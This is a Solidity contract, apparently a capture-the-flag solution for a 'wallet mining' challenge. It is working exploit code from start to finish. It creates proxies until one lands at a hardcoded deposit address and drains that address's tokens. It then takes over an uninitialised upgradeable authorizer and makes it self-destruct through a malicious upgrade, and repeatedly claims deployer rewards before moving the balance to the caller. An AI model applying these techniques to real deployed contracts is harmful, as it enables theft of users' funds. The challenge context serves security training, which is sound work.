// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./WalletDeployer.sol";
import "./AuthorizerUpgradeable.sol";
import "./FakeAuthorizer.sol";
import "./FakeSafe.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";
contract WalletMiningAttacker {
    using Address for address;
    WalletDeployer deployer;
    address token;
    address authorizer;
    IGnosisSafeProxyFactory public constant fact = IGnosisSafeProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
    address public constant copy = 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F;
    address private constant DEPOSIT_ADDRESS = 0x9B6fb606A9f5789444c17768c6dFCF2f83563801;
    constructor(WalletDeployer _deployer, address _token, address _authorizer) {
        deployer = _deployer;
        token = _token;
        authorizer = _authorizer;
    }
    function attack() external {
        FakeSafe safe = new FakeSafe();
        for (uint i=1; i<44; i++) {
            if (i==43) 
                fact.createProxy(address(safe), abi.encodeWithSignature("drain(address,address)", token, msg.sender));
            else 
                fact.createProxy(address(safe), "");
        }
        require(authorizer.isContract(), "AuthorizerUpgradeable contract doesn't exist");
        AuthorizerUpgradeable authorizerImplementation = AuthorizerUpgradeable(authorizer);
        address[] memory _wards = new address[](1);
        _wards[0] = address(this);
        address[] memory _aims  = new address[](1);
        _aims[0] = token;
        authorizerImplementation.init(_wards, _aims);
        FakeAuthorizer fakeAuthorizer = new FakeAuthorizer();
        authorizerImplementation.upgradeToAndCall(address(fakeAuthorizer), abi.encodeWithSignature("kill()"));
        //authorizerImplementation will be selfdestructed after transacton succeed
    }
    function attack2() external {
        require(!authorizer.isContract(), "AuthorizerUpgradeable contract didn't selftdestruct successfully");
        for (uint i=0; i<43; i++) {
            deployer.drop("");
        }
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));

    }
}